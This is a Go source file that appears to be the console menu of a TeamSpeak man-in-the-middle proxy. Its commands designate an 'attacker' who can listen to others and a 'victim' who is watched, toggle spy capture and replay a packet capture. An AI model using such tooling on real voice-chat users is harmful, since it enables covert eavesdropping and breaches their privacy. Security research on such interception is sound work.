package main

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
)

func (proxy *proxyInterface) setupMenu(){
	reader := bufio.NewReader(os.Stdin)
	text, _ := reader.ReadString('\n')
	command := text[0 : len(text)-1]

	if command == "help" {
		fmt.Println("output@11608 - to set output user")
		fmt.Println("attacker@127.0.0.1:64859 - to set user who will be able to listen others")
		fmt.Println("victim@127.0.0.1:64858 - to set user who will watched")
	}
	if command == "5" {
		if proxy.startCapture == true {
			fmt.Println("--- Spy - F")
			proxy.startCapture = false
		} else {
			fmt.Println("--- Spy - T")
			proxy.startCapture = true
		}
	}

	if command == "!file" {
		go proxy.readFromFile("channels.pcapng")
	}

	if strings.HasPrefix(command, "attacker@") {
		id := strings.Split(command, "@")
		for _, user := range proxy.usersMap {
			if user.userTeamspeakAddressIP == id[1] {
				proxy.attacker = user.userAddressIP
				break
			}
		}

		fmt.Printf("%s \n", id[1])
	}
	if strings.HasPrefix(command, "victim@") {
		id := strings.Split(command, "@")
		for _, user := range proxy.usersMap {
			if user.userTeamspeakAddressIP == id[1] {
				proxy.victim = user.userAddressIP
				break
			}
		}
		fmt.Printf("%s \n", id[1])
	}
	if strings.HasPrefix(command, "output@") {
		id := strings.Split(command, "@")
		userID, _ := strconv.ParseUint(id[1], 10, 16)
		proxy.outputUser = uint16(userID)

		fmt.Printf("%s \n", id[1])
	}
}
